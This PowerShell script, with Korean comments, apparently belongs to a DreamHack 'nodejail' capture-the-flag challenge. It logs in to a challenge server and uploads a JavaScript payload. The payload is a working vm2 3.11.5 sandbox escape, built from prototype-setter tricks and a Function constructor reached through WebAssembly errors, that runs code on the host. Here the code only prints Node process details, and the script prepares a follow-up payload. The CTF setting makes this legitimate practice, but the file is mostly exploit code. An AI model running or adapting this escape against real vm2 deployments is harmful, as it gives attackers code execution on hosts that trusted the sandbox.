$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# nodejail KotH - 서버 정찰 (node 버전/플랫폼/arch/getBuiltinModule)
# flag 는 읽지 않는다. 호스트 process 정보만 stdout 으로 출력하는 정찰 페이로드를 제출하고
# 서버 응답을 그대로 보여준다. (서버가 틀린 제출의 stdout 을 돌려줘야 버전이 보인다)

$base = $env:KOTH_BASE
if (-not $base) { $base = 'http://204.48.30.25:9000' }
$token = $env:KOTH_TOKEN
if (-not $token) { $token = Read-Host 'DreamHack 토큰 입력' }
if (-not $token) { Write-Host '토큰이 없습니다.'; exit 1 }

# 정찰 페이로드 (vm2 3.11.5 탈출, RCE 본문만 process 정보 출력으로 교체)
$payload = 'c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch(e=>{C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null);W().catch(e=>e.toString.constructor`console.log(process.version+" "+process.platform+" "+process.arch+" gBM="+(typeof process.getBuiltinModule))`())})'

Write-Host ('서버: ' + $base)
Write-Host '로그인 중...'
try {
    $null = Invoke-WebRequest -Uri ($base + '/login') -Method Post `
        -Body (@{ token = $token } | ConvertTo-Json) -ContentType 'application/json' `
        -SessionVariable sess -UseBasicParsing -TimeoutSec 30
    Write-Host '로그인 OK'
} catch {
    Write-Host ('로그인/연결 실패: ' + $_.Exception.Message)
    Write-Host '이 PC 에서 서버로 연결이 안 됩니다 (문제 네트워크/VPN 을 확인하세요).'
    exit 2
}

# multipart/form-data 수동 구성 (Windows PowerShell 5.1 호환)
$bnd  = '----b' + [guid]::NewGuid().ToString('N')
$LF   = "`r`n"
$body = '--' + $bnd + $LF +
        'Content-Disposition: form-data; name="file"; filename="payload.js"' + $LF +
        'Content-Type: text/javascript' + $LF + $LF +
        $payload + $LF +
        '--' + $bnd + '--' + $LF

Write-Host '정찰 페이로드 제출 중...'
try {
    $sub = Invoke-WebRequest -Uri ($base + '/submit') -Method Post -Body $body `
        -ContentType ('multipart/form-data; boundary=' + $bnd) `
        -WebSession $sess -UseBasicParsing -TimeoutSec 60
    Write-Host ('SUBMIT ' + $sub.StatusCode)
    Write-Host '--- 서버 응답 ---'
    Write-Host $sub.Content
} catch {
    Write-Host ('SUBMIT 응답: ' + $_.Exception.Message)
    if ($_.Exception.Response) {
        $rs = New-Object IO.StreamReader($_.Exception.Response.GetResponseStream())
        Write-Host '--- 서버 응답(에러 본문) ---'
        Write-Host $rs.ReadToEnd()
    }
}

Write-Host '제출 내역 조회...'
try {
    $me = Invoke-WebRequest -Uri ($base + '/me/submissions') -WebSession $sess -UseBasicParsing -TimeoutSec 30
    Write-Host '--- /me/submissions ---'
    Write-Host $me.Content
} catch {
    Write-Host ('submissions: ' + $_.Exception.Message)
}

Write-Host ''
Write-Host '=> 위 응답에서 node 버전(vXX.X.X) / 플랫폼 / gBM=function 여부를 확인하세요.'
Write-Host '   - gBM=function 이고 v20.16+ 또는 v22.3+ 이면 payload.js(264B) 사용 가능'
Write-Host '   - 버전이 안 보이면: 서버가 틀린 제출의 stdout 을 돌려주지 않는 것 (정찰 불가)'
